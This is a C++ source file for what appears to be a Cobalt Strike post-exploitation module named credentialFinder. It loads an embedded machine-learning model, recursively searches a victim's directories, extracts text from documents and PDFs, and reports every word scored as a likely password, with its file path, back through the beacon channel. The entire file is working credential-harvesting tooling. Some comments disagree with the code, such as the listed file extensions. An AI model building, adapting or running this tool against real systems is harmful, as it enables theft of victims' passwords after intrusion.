#include "pch.h"
#include <cstdio>

#include "beacon.h"
#include "debug.h"
#include "dllmain.h"
#include "macros.h"
#include "mock.h"
#include "pipes.h"
#include "utils.h"

#include <winrt/Windows.AI.MachineLearning.h>
#include <winrt/Windows.Storage.h>
#include <winrt/Windows.Storage.Streams.h>

#include "ai_model.h"   // modelBytes
#include "ai_util.h"    // pre-processing 

#include "rust.h"

using namespace winrt;
using namespace Windows::AI::MachineLearning;
using namespace Windows::Storage;
using namespace Windows::Storage::Streams;

#define MAX_PASS_LENGTH 32 // Per the model training
#define MIN_PASS_LENGTH 7 // Per the model training

/**
 * @brief Loads a learning model from an IRandomAccessStreamReference.
 *
 * @param modelStream       The input stream containing the learning model data.
 * @param operatorProvider  An optional ILearningModelOperatorProvider instance to be used when loading the model. Defaults to nullptr.
 *
 * @return A reference to the loaded LearningModel instance, or nullptr if the model could not be loaded.
 */
LearningModel LoadModelFromStream(IRandomAccessStreamReference const& modelStream, ILearningModelOperatorProvider const& operatorProvider = nullptr)
{
    /* validate args or early return nullptr */
    if (modelStream == nullptr) {
        return nullptr;
    }

    /* actually load the model from stream */
    auto model = LearningModel::LoadFromStream(modelStream, operatorProvider);

    return model;
}

/**
 * @brief Loads a machine learning model from raw bytes.
 *
 * This function reads the provided model bytes into an in-memory stream,
 * writes the data to the stream using DataWriter, and then loads the
 * model from the resulting stream reference. The COM apartment is
 * initialized for this thread before proceeding with the operation.
 *
 * @return A pointer to the loaded machine learning model
 */
LearningModel LoadModel()
{
    /* Ensure the COM apartment is initialized for this thread */
    init_apartment();

    /* Create an in - memory stream */
    InMemoryRandomAccessStream memoryStream;

    /* Create a DataWriter to write the raw bytes to the stream */
    DataWriter writer(memoryStream);
    writer.WriteBytes(array_view<const uint8_t>(modelBytes, modelBytes + sizeof(modelBytes)));
    writer.StoreAsync().get();  // Ensure data is written to the stream
    writer.FlushAsync().get();

    /* Rewind the stream to the beginning */
    memoryStream.Seek(0);

    /* Create a stream reference from the in - memory stream */
    RandomAccessStreamReference streamReference = RandomAccessStreamReference::CreateFromStream(memoryStream);
    if (streamReference == nullptr) {
        return nullptr;
    }


    /* Load the model from the stream reference */
    LearningModel model = LoadModelFromStream(streamReference);

    return model;
}

/**
 * @brief Calculates the probability of a password given a test string using a deep learning model.
 *
 * @param deepPassModel The deep learning model to use for prediction.
 * @param testString    A pointer to a char array containing the test string.
 *
 * @return The predicted probability of the string being a password a float value between 0 and 1.
 */
float GetPasswordProbability(LearningModel deepPassModel, UCHAR* testString) {

    /* check the test string pointer and correct length */
    if (testString == NULL || strlen((char*)testString) < MIN_PASS_LENGTH || strlen((char*)testString) > MAX_PASS_LENGTH) {
        return 0.0f;
    }

    /* Set model device to CPU for max compatability */
    LearningModelDevice device = LearningModelDevice(LearningModelDeviceKind::Cpu);

    /* Create Session and binding */
    LearningModelSession session(deepPassModel, device);
    LearningModelBinding binding(session);

    /* Get encodings from test strings */
    std::vector<int64_t> encodedInput = EncodeWord(std::string((char*)testString));

    /* Allocate setup shape for input tensor */
    std::vector<int64_t> shapeInput = { 1, (int64_t)encodedInput.size() };

    /* Build input tensor from input shape and data */
    TensorInt64Bit inputTensor = TensorInt64Bit::CreateFromIterable(shapeInput, encodedInput);

    /* Bind required inputs to model's input features */
    binding.Bind(deepPassModel.InputFeatures().GetAt(0).Name(), inputTensor);

    /* Run the model on the inputs */
    auto results = session.Evaluate(binding, L"\0"); // Second param is supposed to be optional per the docs, but this call will fail on Win 10 without *some* wchar* in there

    /* Get the results as a vector */
    auto resultsVector = results.Outputs().Lookup(deepPassModel.OutputFeatures().GetAt(0).Name()).as<TensorFloat>().GetAsVectorView();

    /* deepPassModel returns only 1 output, a probability expressed as a float */
    return resultsVector.GetAt(0);
}

/**
 * @brief Checks if a given file path has a valid file extension.
 *
 * This function extracts the file extension from the provided file path and verifies
 * whether it matches one of the allowed extensions. The comparison is case-insensitive,
 * and the set of valid extensions is predefined and limited to those supported by an
 * associated Rust FFI crate.
 *
 * Valid extensions include:
 * - .txt
 * - .pdf
 * - .html
 * - .docx
 * - .xlsx
 * - .odt
 * - .pptx
 * - .odp
 * - .doc
 *
 * @param filePath A null-terminated string representing the path to the file.
 * @return TRUE if the file has a valid extension, FALSE otherwise.
 *
 * @note The function only checks the file extension and does not validate the file's existence or contents.
 * @note The comparison is case-insensitive (e.g., ".PDF" is considered valid).
 */
BOOL IsValidFile(const CHAR* filePath) {
    /* List of valid extensions supported by the Rust extraction function */
    const std::vector<std::string> validExtensions = {
        ".txt", ".pdf", ".html", ".docx", ".xlsx", ".pptx", ".odp", ".ods", ".odt"
    };

    std::string fileStr(filePath);

    /* find position of the period */
    size_t dotPos = fileStr.find_last_of('.');

    /* if we found a period */
    if (dotPos != std::string::npos) {
    
        std::string extension = fileStr.substr(dotPos);
        std::transform(extension.begin(), extension.end(), extension.begin(), tolower);

        /* Check if the extension is valid */
        if (std::find(validExtensions.begin(), validExtensions.end(), extension) != validExtensions.end()){
            return TRUE;
        }
    }
    /* if we make it here then we should return FALSE */
    return FALSE;
}

/**
 * @brief Recursively traverses a directory and performs semantic similarity comparisons on valid files.
 *
 * This function walks through a directory tree starting from the specified root path and evaluates each
 * valid file against a reference string using a machine learning model. For each file:
 * - If the confidence exceeds the given threshold, it reports the match via `BeaconPrintf`.
 * @param rootPath A null-terminated C-string path to the root directory to begin traversal.
 * @param model A `LearningModel` capable of classifing password/string classes.
 * @param threshold A float between 0 and 1 representing the similarity threshold for reporting matches.
 * @return TRUE if the operation completes successfully, FALSE if an error occurs (e.g., access denied or I/O failure).
 *
 * @note This function only considers files with supported extensions (as defined in `IsValidFile`).
 * @note Text extraction is performed using an external function `extract_text`, and memory is released with `free_extracted_text`.
 * @note The function will stop early and return FALSE if any subdirectory traversal or file operation fails.
 *
 * @warning Assumes extracted text is valid UTF-8/ASCII. Non-text content may cause undefined behavior.
 * @warning All printed output is truncated to 64 characters of the extracted string for readability.
 *
 * @example
 * @code
 * LearningModel model = LoadModelFromBuffer(buffer, size);
 * SemanticSearchDirectoryContents("C:\\Documents\\Reports", model, 0.85f, );
 * @endcode
 */
BOOL SearchDirectoryForPasswords(const CHAR* rootPath, LearningModel deepPassModel, float threshold = .9999f) {
    
    WIN32_FIND_DATAA findFileData;

    HANDLE hFind       = INVALID_HANDLE_VALUE;
    
    UCHAR* fileContent = NULL;

    BOOL bResult       = FALSE;

    float probability = 0.0f;

    std::string fullFilePath;
    std::string searchPath;
    std::string inputPath;

    std::vector<std::string> subDirFiles;
    std::vector<std::string> allFilePaths;
    std::vector<std::string> fileWords;

    __stosb((PBYTE)&findFileData, 0, sizeof(findFileData));

    if (rootPath == NULL) {
        goto Cleanup;
    }

    inputPath = std::string(rootPath);

    if (inputPath.back() != '\\') {
        inputPath += '\\';
    }

    searchPath  = inputPath + "*";

    hFind = FindFirstFileA(searchPath.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open search directory.");
        goto Cleanup;
    }

    do {

        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0){
            continue;
        }

        fullFilePath = inputPath + findFileData.cFileName;

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Recurse into the subdirectory */
            if (!SearchDirectoryForPasswords(fullFilePath.c_str(), deepPassModel, threshold)) {
                continue;
            }
        }
        else {
            /* Make sure we can interact with this file extension */
            if (!IsValidFile(fullFilePath.c_str())) {
                continue;
            }

            /* Get pointer to extracted text, Rust handles the allocation of this buffer as a CString */
            fileContent = (UCHAR*) extract_text(fullFilePath.c_str(), strlen(fullFilePath.c_str()));

            /* Split content by words */
            fileWords = SplitBufferByWhitespace(fileContent, strlen((const char*)fileContent));

            /* Pass pointer back into Rust code so it can be "free'd" */
            free_extracted_text((const CHAR*)fileContent);

            /* Print probabilities for all words */
            for (auto word : fileWords) {

                /* Get the probability that this "word" is a password */
                probability = GetPasswordProbability(deepPassModel, (UCHAR*)word.c_str());

                /* if probability of password > threshold */
                if (probability >= threshold) {
                    BeaconPrintf(CALLBACK_OUTPUT, "\nFile path: %s\nString: %s\nPassword probability: %.4f%%\n", fullFilePath.c_str(), word.c_str(), (probability*100));
                }

            }

        }
    /* continue looping */
    } while (FindNextFileA(hFind, &findFileData) != 0);

    bResult = TRUE;

Cleanup:

    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
    }

    return bResult;
}

void ErrorUsage() {
    BeaconPrintf(CALLBACK_ERROR, "Usage: credentialFinder [arch] [pid] [root_path] [threshold]\n");
}

/**
* The postex DLL's main() function
* 
* @param postexData A pointer to a POSTEX_DATA structure
*/
/**
* The postex DLL's main() function
* 
* @param postexData A pointer to a POSTEX_DATA structure
*/
void PostexMain(PPOSTEX_DATA postexData) {

    /* Validate that initialization did not fail */
    RETURN_ON_NULL(postexData);

    /* default probability threshold */
    float threshold   = .3000f;
#ifndef _DEBUG

    if (postexData->UserArgumentInfo.Buffer == NULL) {
        ErrorUsage();
        return;
    }

    datap parser;
    BeaconDataParse(&parser, postexData->UserArgumentInfo.Buffer, postexData->UserArgumentInfo.Size);

    /* cast first arg as file path */
    CHAR* filePath     = BeaconDataExtract(&parser, NULL);
    CHAR* thresholdStr = nullptr;

    thresholdStr = BeaconDataExtract(&parser, NULL); // .cna makes sure we always receive something for this arg
    threshold = std::atof(thresholdStr);

    if (threshold <= 0.01) {
        ErrorUsage();
        return;
    }
#else
    const CHAR* filePath = "[...test path...]";
#endif

    BeaconPrintf(CALLBACK_OUTPUT, "Beginning Search from: %s\nThreshold probability:%.4f%%\n", (char*)filePath, (threshold*100));
    /* Load deepPassModel model */
    LearningModel deepPassModel = LoadModel();
    
    /* Failed to load model */
    if (deepPassModel == nullptr) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load model.");
        return;
    }

    SearchDirectoryForPasswords((const CHAR*)filePath, deepPassModel, threshold);

    BeaconPrintf(CALLBACK_OUTPUT, "Completed search on: %s", (char*)filePath);

    return;
}

